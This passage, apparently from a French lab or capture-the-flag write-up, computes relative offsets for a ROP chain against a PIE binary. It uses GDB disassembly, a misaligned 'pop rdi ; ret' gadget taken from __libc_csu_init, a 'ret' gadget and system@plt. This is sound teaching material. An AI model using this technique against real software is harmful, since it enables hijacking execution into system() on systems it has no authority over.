\section{Calcul des distances nécessaires à la chaîne ROP}

Pour contourner la protection PIE (\textit{Position Independent Executable}), les adresses absolues ne sont pas fiables. Nous devons calculer les \textbf{distances relatives} (offsets) entre notre point de détournement (l'adresse de retour sur la pile) et nos cibles.

\subsection{Identification des adresses clés via GDB}

À l'aide du débogueur, nous avons extrait les adresses suivantes lors d'une session d'exécution unique :

\begin{itemize}
    \item \textbf{Adresse de référence ($Ref$)} : Il s'agit de l'adresse de retour sauvegardée sur la pile par la fonction \texttt{makePing}. Dans le désassemblage de \texttt{main}, c'est l'instruction suivant immédiatement l'appel :
    \begin{lstlisting}[language=bash, basicstyle=\footnotesize\ttfamily]
0x00005555555554ee <+24>:    call   0x5555555553b3 <makePing>
0x00005555555554f3 <+29>:    mov    $0x0,%eax  <-- ADRESSE REF
    \end{lstlisting}
    
    \item \textbf{Adresse de System ($System$)} : L'entrée de la fonction dans la PLT.
    \item \textbf{Adresse du Gadget ($Gadget_{POP}$)} : Nous avons identifié un "Universal Gadget" dans la fonction \texttt{\_\_libc\_csu\_init}.
    \item \textbf{Adresse du Gadget RET ($Gadget_{RET}$)} : Nécessaire pour le déclenchement final de la chaîne (Trigger). Nous utilisons l'instruction \texttt{ret} présente à la fin de la fonction \texttt{main}.
\end{itemize}

\subsubsection{Analyse des Gadgets}

\paragraph{Gadget "POP RDI" :}
En l'absence d'instruction \texttt{pop rdi} explicite, nous exploitons la séquence de nettoyage de la fonction standard \texttt{\_\_libc\_csu\_init}. L'instruction \texttt{pop r15} qui s'y trouve (à l'adresse \texttt{0x...5562}) est encodée par les octets \texttt{\textbf{41} 5f c3}. En ciblant l'exécution un octet plus loin (à \texttt{0x...5563}), nous forçons le processeur à ignorer le préfixe \texttt{41} et à interpréter le reste (\texttt{5f c3}) comme l'instruction \texttt{pop rdi ; ret}, créant ainsi le gadget nécessaire artificiellement.
\[ Adresse_{POP} = 0x555555555562 + 1 = \textbf{0x555555555563} \]

\paragraph{Gadget "RET" :}
Le désassemblage de la fonction \texttt{main} montre une instruction \texttt{ret} à l'offset \texttt{+35}.
\begin{lstlisting}[language=bash, basicstyle=\footnotesize\ttfamily]
0x00005555555554f8 <+34>:    leave 
0x00005555555554f9 <+35>:    ret       <-- GADGET RET
\end{lstlisting}
\[ Adresse_{RET} = \textbf{0x5555555554f9} \]

\subsection{Tableau récapitulatif des adresses}

\begin{table}[H]
    \centering
    \begin{tabular}{|l|l|c|}
        \hline
        \textbf{Élément} & \textbf{Description} & \textbf{Adresse (Hex)} \\
        \hline
        Référence ($Ref$) & Adresse de retour (dans main) & \texttt{0x5555555554f3} \\ 
        \hline
        Cible 1 ($Gadget_{POP}$) & \texttt{pop rdi ; ret} (csu\_init) & \texttt{0x555555555563} \\ 
        \hline
        Cible 2 ($System$) & \texttt{system@plt} & \texttt{0x555555555100} \\ 
        \hline
        Cible 3 ($Gadget_{RET}$) & \texttt{ret} (fin de main) & \texttt{0x5555555554f9} \\ 
        \hline
    \end{tabular}
    \caption{Adresses relevées sous GDB}
\end{table}

\subsection{Calcul des Distances ($\Delta$)}

Nous calculons la distance $\Delta$ à appliquer à l'adresse de retour ($Ref$) pour atteindre les cibles.

\subsubsection{Distance vers le Gadget POP RDI}
\[ \Delta_{POP} = Gadget_{POP} - Ref \]
\[ \Delta_{POP} = 0x555555555563 - 0x5555555554f3 = \textbf{+0x70} \]
\textbf{Interprétation :} Le gadget se trouve exactement 112 octets après l'adresse de retour.

\subsubsection{Distance vers le Gadget RET}
\[ \Delta_{RET} = Gadget_{RET} - Ref \]
\[ \Delta_{RET} = 0x5555555554f9 - 0x5555555554f3 = \textbf{+0x6} \]
\textbf{Interprétation :} L'instruction \texttt{ret} du \texttt{main} se situe seulement 6 octets après notre point de référence. C'est l'adresse que nous utiliserons lors de la dernière étape (Trigger) pour sauter vers notre ROP chain.

\subsubsection{Distance vers System}
\[ \Delta_{System} = System - Ref \]
\[ \Delta_{System} = 0x555555555100 - 0x5555555554f3 = \textbf{-0x3F3} \]
\textbf{Interprétation :} La fonction \texttt{system} se situe 1011 octets avant l'adresse de retour. Ce décalage constant est utilisé pour calculer l'adresse réelle de \texttt{system} à l'exécution.